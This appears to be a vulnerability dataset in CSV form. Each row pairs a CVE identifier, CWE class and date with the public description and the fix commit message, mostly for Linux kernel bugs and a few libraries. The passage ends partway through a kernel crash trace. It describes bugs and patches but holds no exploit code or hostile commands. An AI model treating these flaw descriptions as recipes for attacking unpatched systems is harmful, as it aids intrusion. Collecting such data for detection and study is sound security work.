CVE-2018-12232,CWE-362,2018-06-12,"In net/socket.c in the Linux kernel through 4.17.1, there is a race condition between fchownat and close in cases where they target the same socket file descriptor, related to the sock_close and sockfs_setattr functions. fchownat does not increment the file descriptor reference count, which allows close to set the socket to NULL during fchownat's execution, leading to a NULL pointer dereference and system crash.","fchownat() doesn't even hold refcnt of fd until it figures out fd is really needed (otherwise is ignored) and releases it after it resolves the path. This means sock_close() could race with sockfs_setattr(), which leads to a NULL pointer dereference since typically we set sock->sk to NULL in ->release().  As pointed out by Al, this is unique to sockfs. So we can fix this in socket layer by acquiring inode_lock in sock_close() and checking against NULL in sockfs_setattr().  sock_release() is called in many places, only the sock_close() path matters here. And fortunately, this should not affect normal sock_close() as it is only called when the last fd refcnt is gone. It only affects sock_close() with a parallel sockfs_setattr() in progress, which is not common.  Fixes: 86741ec (""net: core: Add a UID field to struct sock."") Reported-by: shankarapailoor <shankarapailoor@gmail.com> Cc: Tetsuo Handa <penguin-kernel@i-love.sakura.ne.jp> Cc: Lorenzo Colitti <lorenzo@google.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7798,CWE-326,2017-01-30,"The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.","Remove the encryption key initialization from Cipher#initialize. This is effectively a revert of r32723 (""Avoid possible SEGV from AES encryption/decryption"", 2011-07-28).  r32723, which added the key initialization, was a workaround for Ruby Bug #2768. For some certain ciphers, calling EVP_CipherUpdate() before setting an encryption key caused segfault. It was not a problem until OpenSSL implemented GCM mode - the encryption key could be overridden by repeated calls of EVP_CipherInit_ex(). But, it is not the case for AES-GCM ciphers. Setting a key, an IV, a key, in this order causes the IV to be reset to an all-zero IV.  The problem of Bug #2768 persists on the current versions of OpenSSL. So, make Cipher#update raise an exception if a key is not yet set by the user. Since encrypting or decrypting without key does not make any sense, this should not break existing applications.  Users can still call Cipher#key= and Cipher#iv= multiple times with their own responsibility.  Reference: https://bugs.ruby-lang.org/issues/2768 Reference: https://bugs.ruby-lang.org/issues/8221 Reference: #49"
CVE-2018-13405,CWE-269,2018-07-06,"The inode_init_owner function in fs/inode.c in the Linux kernel through 3.16 allows local users to create files with an unintended group ownership, in a scenario where a directory is SGID to a certain group and is writable by a user who is not a member of that group. Here, the non-member can trigger creation of a plain file whose group ownership is that group. The intended behavior was that the non-member can trigger creation of a directory (but not a plain file) whose group ownership is that group. The non-member can escalate privileges by making the plain file executable and SGID.","sgid directories have special semantics, making newly created files in the directory belong to the group of the directory, and newly created subdirectories will also become sgid.  This is historically used for group-shared directories.  But group directories writable by non-group members should not imply that such non-group members can magically join the group, so make sure to clear the sgid bit on non-directories for non-members (but remember that sgid without group execute means ""mandatory locking"", just to confuse things even more).  Reported-by: Jann Horn <jannh@google.com> Cc: Andy Lutomirski <luto@kernel.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-17434,,2017-12-06,"The daemon in rsync 3.1.2, and 3.1.3-development before 2017-12-03, does not check for fnamecmp filenames in the daemon_filter_list data structure (in the recv_files function in receiver.c) and also does not apply the sanitize_paths protection mechanism to pathnames found in ""xname follows"" strings (in the read_ndx_and_attrs function in rsync.c), which allows remote attackers to bypass intended access restrictions.",
CVE-2017-14497,CWE-119,2017-09-15,"The tpacket_rcv function in net/packet/af_packet.c in the Linux kernel before 4.13 mishandles vnet headers, which might allow local users to cause a denial of service (buffer overflow, and disk and memory corruption) or possibly have unspecified other impact via crafted system calls.","... which may happen with certain values of tp_reserve and maclen.  Fixes: 58d19b1 (""packet: vnet_hdr support for tpacket_rcv"") Signed-off-by: Benjamin Poirier <bpoirier@suse.com> Cc: Willem de Bruijn <willemb@google.com> Acked-by: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-1000252,CWE-20,2017-09-26,"The KVM subsystem in the Linux kernel through 4.13.3 allows guest OS users to cause a denial of service (assertion failure, and hypervisor hang or crash) via an out-of bounds guest_irq value, related to arch/x86/kvm/vmx.c and virt/kvm/eventfd.c.","The value of the guest_irq argument to vmx_update_pi_irte() is ultimately coming from a KVM_IRQFD API call. Do not BUG() in vmx_update_pi_irte() if the value is out-of bounds. (Especially, since KVM as a whole seems to hang after that.)  Instead, print a message only once if we find that we don't have a route for a certain IRQ (which can be out-of-bounds or within the array).  This fixes CVE-2017-1000252.  Fixes: efc6440 (""KVM: x86: Update IRTE for posted-interrupts"") Signed-off-by: Jan H. Schönherr <jschoenh@amazon.de> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2013-2141,CWE-399,2013-06-07,"The do_tkill function in kernel/signal.c in the Linux kernel before 3.8.9 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory via a crafted application that makes a (1) tkill or (2) tgkill system call.","This fixes a kernel memory contents leak via the tkill and tgkill syscalls for compat processes.  This is visible in the siginfo_t->_sifields._rt.si_sigval.sival_ptr field when handling signals delivered from tkill.  The place of the infoleak:  int copy_siginfo_to_user32(compat_siginfo_t __user *to, siginfo_t *from) {         ...         put_user_ex(ptr_to_compat(from->si_ptr), &to->si_ptr);         ... }  Signed-off-by: Emese Revfy <re.emese@gmail.com> Reviewed-by: PaX Team <pageexec@freemail.hu> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Oleg Nesterov <oleg@redhat.com> Cc: ""Eric W. Biederman"" <ebiederm@xmission.com> Cc: Serge Hallyn <serge.hallyn@canonical.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-16996,CWE-119,2017-12-27,kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging register truncation mishandling.,"Properly handle register truncation to a smaller size.  The old code first mirrors the clearing of the high 32 bits in the bitwise tristate representation, which is correct. But then, it computes the new arithmetic bounds as the intersection between the old arithmetic bounds and the bounds resulting from the bitwise tristate representation. Therefore, when coerce_reg_to_32() is called on a number with bounds [0xffff'fff8, 0x1'0000'0007], the verifier computes [0xffff'fff8, 0xffff'ffff] as bounds of the truncated number. This is incorrect: The truncated number could also be in the range [0, 7], and no meaningful arithmetic bounds can be computed in that case apart from the obvious [0, 0xffff'ffff].  Starting with v4.14, this is exploitable by unprivileged users as long as the unprivileged_bpf_disabled sysctl isn't set.  Debian assigned CVE-2017-16996 for this issue.  v2:  - flip the mask during arithmetic bounds calculation (Ben Hutchings) v3:  - add CVE number (Ben Hutchings)  Fixes: b03c9f9 (""bpf/verifier: track signed and unsigned min/max values"") Signed-off-by: Jann Horn <jannh@google.com> Acked-by: Edward Cree <ecree@solarflare.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2016-5096,CWE-190,2016-08-07,Integer overflow in the fread function in ext/standard/file.c in PHP before 5.5.36 and 5.6.x before 5.6.22 allows remote attackers to cause a denial of service or possibly have unspecified other impact via a large integer in the second argument.,
CVE-2015-8575,CWE-200,2016-02-08,"The sco_sock_bind function in net/bluetooth/sco.c in the Linux kernel before 4.3.4 does not verify an address length, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism via a crafted application.",Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2019-14975,CWE-125,2019-08-14,Artifex MuPDF before 1.16.0 has a heap-based buffer over-read in fz_chartorune in fitz/string.c because pdf/pdf-op-filter.c does not check for a missing string.,
CVE-2011-1021,CWE-264,2012-06-21,drivers/acpi/debugfs.c in the Linux kernel before 3.0 allows local users to modify arbitrary kernel memory locations by leveraging root privileges to write to the /sys/kernel/debug/acpi/custom_method file. NOTE: this vulnerability exists because of an incomplete fix for CVE-2010-4347.,"With /sys/kernel/debug/acpi/custom_method root can write to arbitrary memory and increase his priveleges, even if these are restricted.  -> Make this an own debug .config option and warn about the security issue in the config description.  -> Still keep acpi/debugfs.c which now only creates an empty    /sys/kernel/debug/acpi directory. There might be other    users of it later.  Signed-off-by: Thomas Renninger <trenn@suse.de> Acked-by: Rafael J. Wysocki <rjw@sisk.pl> Acked-by: rui.zhang@intel.com Signed-off-by: Len Brown <len.brown@intel.com>"
CVE-2013-2635,CWE-399,2013-03-22,"The rtnl_fill_ifinfo function in net/core/rtnetlink.c in the Linux kernel before 3.8.4 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","Initialize the mac address buffer with 0 as the driver specific function will probably not fill the whole buffer. In fact, all in-kernel drivers fill only ETH_ALEN of the MAX_ADDR_LEN bytes, i.e. 6 of the 32 possible bytes. Therefore we currently leak 26 bytes of stack memory to userland via the netlink interface.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-11523,CWE-835,2017-07-22,"The ReadTXTImage function in coders/txt.c in ImageMagick through 6.9.9-0 and 7.x through 7.0.6-1 allows remote attackers to cause a denial of service (infinite loop) via a crafted file, because the end-of-file condition is not considered.",
CVE-2017-11368,CWE-617,2017-08-09,"In MIT Kerberos 5 (aka krb5) 1.7 and later, an authenticated attacker can cause a KDC assertion failure by sending invalid S4U2Self or S4U2Proxy requests.","Assign status values if S4U2Self padata fails to decode, if an S4U2Proxy request uses invalid KDC options, or if an S4U2Proxy request uses an evidence ticket which does not match the canonicalized request server principal name.  Reported by Samuel Cabrero.  If a status value is not assigned during KDC processing, default to ""UNKNOWN_REASON"" rather than failing an assertion.  This change will prevent future denial of service bugs due to similar mistakes, and will allow us to omit assigning status values for unlikely errors such as small memory allocation failures.  CVE-2017-11368:  In MIT krb5 1.7 and later, an authenticated attacker can cause an assertion failure in krb5kdc by sending an invalid S4U2Self or S4U2Proxy request.    CVSSv3 Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H/E:H/RL:O/RC:C  ticket: 8599 (new) target_version: 1.15-next target_version: 1.14-next tags: pullup"
CVE-2013-6432,,2013-12-09,"The ping_recvmsg function in net/ipv4/ping.c in the Linux kernel before 3.12.4 does not properly interact with read system calls on ping sockets, which allows local users to cause a denial of service (NULL pointer dereference and system crash) by leveraging unspecified privileges to execute a crafted application.",A plain read() on a socket does set msg->msg_name to NULL. So check for NULL pointer first.  Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-5728,CWE-119,2016-06-27,"Race condition in the vop_ioctl function in drivers/misc/mic/vop/vop_vringh.c in the MIC VOP driver in the Linux kernel before 4.6.1 allows local users to obtain sensitive information from kernel memory or cause a denial of service (memory corruption and system crash) by changing a certain header, aka a ""double fetch"" vulnerability.",The MIC VOP driver does two successive reads from user space to read a variable length data structure. Kernel memory corruption can result if the data structure changes between the two reads. This patch disallows the chance of this happening.  Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651 Reported by: Pengfei Wang <wpengfeinudt@gmail.com> Reviewed-by: Sudeep Dutt <sudeep.dutt@intel.com> Signed-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2016-7521,CWE-125,2017-04-20,Heap-based buffer overflow in coders/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.,
CVE-2017-11447,CWE-772,2017-07-19,"The ReadSCREENSHOTImage function in coders/screenshot.c in ImageMagick before 7.0.6-1 has memory leaks, causing denial of service.",
CVE-2017-6952,CWE-190,2017-03-16,Integer overflow in the cs_winkernel_malloc function in winkernel_mm.c in Capstone 3.0.4 and earlier allows attackers to cause a denial of service (heap-based buffer overflow in a kernel driver) or possibly have unspecified other impact via a large value.,* provide a validity check to prevent against Integer overflow conditions  * fix some style issues.
CVE-2016-9685,CWE-400,2016-12-28,Multiple memory leaks in error paths in fs/xfs/xfs_attr_list.c in the Linux kernel before 4.5.1 allow local users to cause a denial of service (memory consumption) via crafted XFS filesystem operations.,This plugs 2 trivial leaks in xfs_attr_shortform_list and xfs_attr3_leaf_list_int.  Signed-off-by: Mateusz Guzik <mguzik@redhat.com> Cc: <stable@vger.kernel.org> Reviewed-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>
CVE-2014-4617,CWE-20,2014-06-25,"The do_uncompress function in g10/compress.c in GnuPG 1.x before 1.4.17 and 2.x before 2.0.24 allows context-dependent attackers to cause a denial of service (infinite loop) via malformed compressed packets, as demonstrated by an a3 01 5b ff byte sequence.",
CVE-2017-9059,CWE-404,2017-05-18,"The NFSv4 implementation in the Linux kernel through 4.11.1 allows local users to cause a denial of service (resource consumption) by leveraging improper channel callback shutdown when unmounting an NFSv4 filesystem, aka a ""module reference and kernel daemon"" leak.","Pull nfsd updates from Bruce Fields:  ""Another RDMA update from Chuck Lever, and a bunch of miscellaneous   bugfixes""  * tag 'nfsd-4.12' of git://linux-nfs.org/~bfields/linux: (26 commits)   nfsd: Fix up the ""supattr_exclcreat"" attributes   nfsd: encoders mustn't use unitialized values in error cases   nfsd: fix undefined behavior in nfsd4_layout_verify   lockd: fix lockd shutdown race   NFSv4: Fix callback server shutdown   SUNRPC: Refactor svc_set_num_threads()   NFSv4.x/callback: Create the callback service through svc_create_pooled   lockd: remove redundant check on block   svcrdma: Clean out old XDR encoders   svcrdma: Remove the req_map cache   svcrdma: Remove unused RDMA Write completion handler   svcrdma: Reduce size of sge array in struct svc_rdma_op_ctxt   svcrdma: Clean up RPC-over-RDMA backchannel reply processing   svcrdma: Report Write/Reply chunk overruns   svcrdma: Clean up RDMA_ERROR path   svcrdma: Use rdma_rw API in RPC reply path   svcrdma: Introduce local rdma_rw API helpers   svcrdma: Clean up svc_rdma_get_inv_rkey()   svcrdma: Add helper to save pages under I/O   svcrdma: Eliminate RPCRDMA_SQ_DEPTH_MULT   ..."
CVE-2017-5668,CWE-476,2017-03-14,bitlbee-libpurple before 3.5.1 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) and possibly execute arbitrary code via a file transfer request for a contact that is not in the contact list.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-10189.,"Followup to 701ab81 (included in 3.5) which was a partial fix which only improved things for non-libpurple file transfers (that is, just jabber)"
CVE-2018-8788,CWE-787,2018-11-29,FreeRDP prior to version 2.0.0-rc4 contains an Out-Of-Bounds Write of up to 4 bytes in function nsc_rle_decode() that results in a memory corruption and possibly even a remote code execution.,Thanks to Eyal Itkin from Check Point Software Technologies.
CVE-2017-9620,CWE-125,2017-07-26,"The xps_select_font_encoding function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted document, related to the xps_encode_font_char_imp function.",
CVE-2018-11590,CWE-190,2018-05-31,Espruino before 1.99 allows attackers to cause a denial of service (application crash) with a user crafted input file via an integer overflow during syntax parsing. This was addressed by fixing stack size detection on Linux in jsutils.c.,
CVE-2017-9225,CWE-787,2017-05-24,"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds write in onigenc_unicode_get_case_fold_codes_by_str() occurs during regular expression compilation. Code point 0xFFFFFFFF is not properly handled in unicode_unfold_key(). A malformed regular expression could result in 4 bytes being written off the end of a stack buffer of expand_case_fold_string() during the call to onigenc_unicode_get_case_fold_codes_by_str(), a typical stack buffer overflow.",
CVE-2014-0077,CWE-787,2014-04-14,"drivers/vhost/net.c in the Linux kernel before 3.13.10, when mergeable buffers are disabled, does not properly validate packet lengths, which allows guest OS users to cause a denial of service (memory corruption and host OS crash) or possibly gain privileges on the host OS via crafted packets, related to the handle_rx and get_rx_bufs functions.","When mergeable buffers are disabled, and the incoming packet is too large for the rx buffer, get_rx_bufs returns success.  This was intentional in order for make recvmsg truncate the packet and then handle_rx would detect err != sock_len and drop it.  Unfortunately we pass the original sock_len to recvmsg - which means we use parts of iov not fully validated.  Fix this up by detecting this overrun and doing packet drop immediately.  CVE-2014-0077  Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-3223,CWE-200,2013-04-22,"The ax25_recvmsg function in net/ax25/af_ax25.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","When msg_namelen is non-zero the sockaddr info gets filled out, as requested, but the code fails to initialize the padding bytes of struct sockaddr_ax25 inserted by the compiler for alignment. Additionally the msg_namelen value is updated to sizeof(struct full_sockaddr_ax25) but is not always filled up to this size.  Both issues lead to the fact that the code will leak uninitialized kernel stack bytes in net/socket.c.  Fix both issues by initializing the memory with memset(0).  Cc: Ralf Baechle <ralf@linux-mips.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-12714,CWE-787,2018-06-24,"An issue was discovered in the Linux kernel through 4.17.2. The filter parsing in kernel/trace/trace_events_filter.c could be called with no filter, which is an N=0 case when it expected at least one line to have been read, thus making the N-1 index invalid. This allows attackers to cause a denial of service (slab out-of-bounds write) or possibly have unspecified other impact via crafted perf_event_open and mmap system calls.","Pull tracing fixes from Steven Rostedt:  ""This contains a few fixes and a clean up.     - a bad merge caused an ""endif"" to go in the wrong place in      scripts/Makefile.build     - softirq tracing fix for tracing that corrupts lockdep and causes a      false splat     - histogram documentation typo fixes     - fix a bad memory reference when passing in no filter to the filter      code     - simplify code by using the swap macro instead of open coding the      swap""  * tag 'trace-v4.18-rc1' of git://git.kernel.org/pub/scm/linux/kernel/git/rostedt/linux-trace:   tracing: Fix SKIP_STACK_VALIDATION=1 build due to bad merge with -mrecord-mcount   tracing: Fix some errors in histogram documentation   tracing: Use swap macro in update_max_tr   softirq: Reorder trace_softirqs_on to prevent lockdep splat   tracing: Check for no filter when processing event filters"
CVE-2012-1146,CWE-476,2012-05-17,"The mem_cgroup_usage_unregister_event function in mm/memcontrol.c in the Linux kernel before 3.2.10 does not properly handle multiple events that are attached to the same eventfd, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by registering memory threshold events.","There is an issue when memcg unregisters events that were attached to the same eventfd:  - On the first call mem_cgroup_usage_unregister_event() removes all   events attached to a given eventfd, and if there were no events left,   thresholds->primary would become NULL;  - Since there were several events registered, cgroups core will call   mem_cgroup_usage_unregister_event() again, but now kernel will oops,   as the function doesn't expect that threshold->primary may be NULL.  That's a good question whether mem_cgroup_usage_unregister_event() should actually remove all events in one go, but nowadays it can't do any better as cftype->unregister_event callback doesn't pass any private event-associated cookie. So, let's fix the issue by simply checking for threshold->primary.  FWIW, w/o the patch the following oops may be observed:   BUG: unable to handle kernel NULL pointer dereference at 0000000000000004  IP: [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c/0x1f0  Pid: 574, comm: kworker/0:2 Not tainted 3.3.0-rc4+ #9 Bochs Bochs  RIP: 0010:[<ffffffff810be32c>]  [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c/0x1f0  RSP: 0018:ffff88001d0b9d60  EFLAGS: 00010246  Process kworker/0:2 (pid: 574, threadinfo ffff88001d0b8000, task ffff88001de91cc0)  Call Trace:   [<ffffffff8107092b>] cgroup_event_remove+0x2b/0x60   [<ffffffff8103db94>] process_one_work+0x174/0x450   [<ffffffff8103e413>] worker_thread+0x123/0x2d0  Cc: stable <stable@vger.kernel.org> Signed-off-by: Anton Vorontsov <anton.vorontsov@linaro.org> Acked-by: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com> Cc: Kirill A. Shutemov <kirill@shutemov.name> Cc: Michal Hocko <mhocko@suse.cz> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-9610,CWE-125,2017-07-26,The xps_load_sfnt_name function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted document.,
CVE-2018-14881,CWE-125,2019-10-03,The BGP parser in tcpdump before 4.9.3 has a buffer over-read in print-bgp.c:bgp_capabilities_print() (BGP_CAPCODE_RESTART).,"Add a bounds check and a comment to bgp_capabilities_print().  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2019-15946,CWE-119,2019-09-05,OpenSC before 0.20.0-rc1 has an out-of-bounds access of an ASN.1 Octet string in asn1_decode_entry in libopensc/asn1.c.,Credit to OSS-Fuzz
CVE-2014-7283,CWE-399,2014-10-13,"The xfs_da3_fixhashpath function in fs/xfs/xfs_da_btree.c in the xfs implementation in the Linux kernel before 3.14.2 does not properly compare btree hash values, which allows local users to cause a denial of service (filesystem corruption, and OOPS or panic) via operations on directories that have hash collisions, as demonstrated by rmdir operations.","Commit f5ea110 (""xfs: add CRCs to dir2/da node blocks"") introduced in 3.10 incorrectly converted the btree hash index array pointer in xfs_da3_fixhashpath(). It resulted in the the current hash always being compared against the first entry in the btree rather than the current block index into the btree block's hash entry array. As a result, it was comparing the wrong hashes, and so could misorder the entries in the btree.  For most cases, this doesn't cause any problems as it requires hash collisions to expose the ordering problem. However, when there are hash collisions within a directory there is a very good probability that the entries will be ordered incorrectly and that actually matters when duplicate hashes are placed into or removed from the btree block hash entry array.  This bug results in an on-disk directory corruption and that results in directory verifier functions throwing corruption warnings into the logs. While no data or directory entries are lost, access to them may be compromised, and attempts to remove entries from a directory that has suffered from this corruption may result in a filesystem shutdown.  xfs_repair will fix the directory hash ordering without data loss occuring.  [dchinner: wrote useful a commit message]  cc: <stable@vger.kernel.org> Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Mark Tinguely <tinguely@sgi.com> Reviewed-by: Ben Myers <bpm@sgi.com> Signed-off-by: Dave Chinner <david@fromorbit.com>"
CVE-2017-3733,CWE-20,2017-05-04,During a renegotiation handshake if the Encrypt-Then-Mac extension is negotiated where it was not in the original handshake (or vice-versa) then this can cause OpenSSL 1.1.0 before 1.1.0e to crash (dependent on ciphersuite). Both clients and servers are affected.,"Changing the ciphersuite during a renegotiation can result in a crash leading to a DoS attack. ETM has not been implemented in 1.1.0 for DTLS so this is TLS only.  The problem is caused by changing the flag indicating whether to use ETM or not immediately on negotiation of ETM, rather than at CCS. Therefore, during a renegotiation, if the ETM state is changing (usually due to a change of ciphersuite), then an error/crash will occur.  Due to the fact that there are separate CCS messages for read and write we actually now need two flags to determine whether to use ETM or not.  CVE-2017-3733  Reviewed-by: Richard Levitte <levitte@openssl.org>"
CVE-2019-1010319,CWE-457,2019-07-11,"WavPack 5.1.0 and earlier is affected by: CWE-457: Use of Uninitialized Variable. The impact is: Unexpected control flow, crashes, and segfaults. The component is: ParseWave64HeaderConfig (wave64.c:211). The attack vector is: Maliciously crafted .wav file. The fixed version is: After commit https://github.com/dbry/WavPack/commit/33a0025d1d63ccd05d9dbaa6923d52b1446a62fe.",
CVE-2017-13083,CWE-295,2017-10-18,"Akeo Consulting Rufus prior to version 2.17.1187 does not adequately validate the integrity of updates downloaded over HTTP, allowing an attacker to easily convince a user to execute arbitrary code","* This commit effectively fixes https://www.kb.cert.org/vuls/id/403768 (CVE-2017-13083) as   it is described per its revision 11, which is the latest revision at the time of this commit,   by disabling Windows prompts, enacted during signature validation, that allow the user to   bypass the intended signature verification checks. * It needs to be pointed out that the vulnerability (""allow(ing) the use of a self-signed   certificate""), which relies on the end-user actively ignoring a Windows prompt that tells   them that the update failed the signature validation whilst also advising against running it,   is being fully addressed, even as the update protocol remains HTTP. * It also need to be pointed out that the extended delay (48 hours) between the time the   vulnerability was reported and the moment it is fixed in our codebase has to do with   the fact that the reporter chose to deviate from standard security practices by not   disclosing the details of the vulnerability with us, be it publicly or privately,   before creating the cert.org report. The only advance notification we received was a   generic note about the use of HTTP vs HTTPS, which, as have established, is not   immediately relevant to addressing the reported vulnerability. * Closes #1009 * Note: The other vulnerability scenario described towards the end of #1009, which   doesn't have to do with the ""lack of CA checking"", will be addressed separately."
CVE-2018-20103,CWE-835,2018-12-12,"An issue was discovered in dns.c in HAProxy through 1.8.14. In the case of a compressed pointer, a crafted packet can trigger infinite recursion by making the pointer point to itself, or create a long chain of valid pointers resulting in stack exhaustion.",
CVE-2017-6439,CWE-787,2017-03-15,Heap-based buffer overflow in the parse_string_node function in bplist.c in libimobiledevice libplist 1.12 allows local users to cause a denial of service (out-of-bounds write) via a crafted plist file.,"Passing a size of 0xFFFFFFFFFFFFFFFF to parse_string_node() might result in a memcpy with a size of -1, leading to undefined behavior. This commit makes sure that the actual node data (which depends on the size) is in the range start_of_object..start_of_object+size.  Credit to OSS-Fuzz"
CVE-2011-3346,CWE-119,2014-04-01,"Buffer overflow in hw/scsi-disk.c in the SCSI subsystem in QEMU before 0.15.2, as used by Xen, might allow local guest users with permission to access the CD-ROM to cause a denial of service (guest crash) via a crafted SAI READ CAPACITY SCSI command.  NOTE: this is only a vulnerability when root has manually modified certain permissions or ACLs.","Also, consistently use qiov.size instead of iov.iov_len.  Signed-off-by: Paolo Bonzini <pbonzini@redhat.com> Signed-off-by: Kevin Wolf <kwolf@redhat.com>"
CVE-2017-14171,CWE-834,2017-09-07,"In libavformat/nsvdec.c in FFmpeg 2.4 and 3.3.3, a DoS in nsv_parse_NSVf_header() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted NSV file, which claims a large ""table_entries_used"" field in the header but does not contain sufficient backing data, is provided, the loop over 'table_entries_used' would consume huge CPU resources, since there is no EOF check inside the loop.","Fixes: 20170829.nsv  Co-Author: 张洪亮(望初)"" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2011-4324,,2012-06-21,The encode_share_access function in fs/nfs/nfs4xdr.c in the Linux kernel before 2.6.29 allows local users to cause a denial of service (BUG and system crash) by using the mknod system call with a pathname on an NFSv4 filesystem.,Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>
CVE-2013-4162,CWE-399,2013-07-29,"The udp_v6_push_pending_frames function in net/ipv6/udp.c in the IPv6 implementation in the Linux kernel through 3.10.3 makes an incorrect function call for pending data, which allows local users to cause a denial of service (BUG and system crash) via a crafted application that uses the UDP_CORK option in a setsockopt system call.","We accidentally call down to ip6_push_pending_frames when uncorking pending AF_INET data on a ipv6 socket. This results in the following splat (from Dave Jones):  skbuff: skb_under_panic: text:ffffffff816765f6 len:48 put:40 head:ffff88013deb6df0 data:ffff88013deb6dec tail:0x2c end:0xc0 dev:<NULL> ------------[ cut here ]------------ kernel BUG at net/core/skbuff.c:126! invalid opcode: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC Modules linked in: dccp_ipv4 dccp 8021q garp bridge stp dlci mpoa snd_seq_dummy sctp fuse hidp tun bnep nfnetlink scsi_transport_iscsi rfcomm can_raw can_bcm af_802154 appletalk caif_socket can caif ipt_ULOG x25 rose af_key pppoe pppox ipx phonet irda llc2 ppp_generic slhc p8023 psnap p8022 llc crc_ccitt atm bluetooth +netrom ax25 nfc rfkill rds af_rxrpc coretemp hwmon kvm_intel kvm crc32c_intel snd_hda_codec_realtek ghash_clmulni_intel microcode pcspkr snd_hda_codec_hdmi snd_hda_intel snd_hda_codec snd_hwdep usb_debug snd_seq snd_seq_device snd_pcm e1000e snd_page_alloc snd_timer ptp snd pps_core soundcore xfs libcrc32c CPU: 2 PID: 8095 Comm: trinity-child2 Not tainted 3.10.0-rc7+ #37 task: ffff8801f52c2520 ti: ffff8801e6430000 task.ti: ffff8801e6430000 RIP: 0010:[<ffffffff816e759c>]  [<ffffffff816e759c>] skb_panic+0x63/0x65 RSP: 0018:ffff8801e6431de8  EFLAGS: 00010282 RAX: 0000000000000086 RBX: ffff8802353d3cc0 RCX: 0000000000000006 RDX: 0000000000003b90 RSI: ffff8801f52c2ca0 RDI: ffff8801f52c2520 RBP: ffff8801e6431e08 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000001 R11: 0000000000000001 R12: ffff88022ea0c800 R13: ffff88022ea0cdf8 R14: ffff8802353ecb40 R15: ffffffff81cc7800 FS:  00007f5720a10740(0000) GS:ffff880244c00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000005862000 CR3: 000000022843c000 CR4: 00000000001407e0 DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600 Stack:  ffff88013deb6dec 000000000000002c 00000000000000c0 ffffffff81a3f6e4  ffff8801e6431e18 ffffffff8159a9aa ffff8801e6431e90 ffffffff816765f6  ffffffff810b756b 0000000700000002 ffff8801e6431e40 0000fea9292aa8c0 Call Trace:  [<ffffffff8159a9aa>] skb_push+0x3a/0x40  [<ffffffff816765f6>] ip6_push_pending_frames+0x1f6/0x4d0  [<ffffffff810b756b>] ? mark_held_locks+0xbb/0x140  [<ffffffff81694919>] udp_v6_push_pending_frames+0x2b9/0x3d0  [<ffffffff81694660>] ? udplite_getfrag+0x20/0x20  [<ffffffff8162092a>] udp_lib_setsockopt+0x1aa/0x1f0  [<ffffffff811cc5e7>] 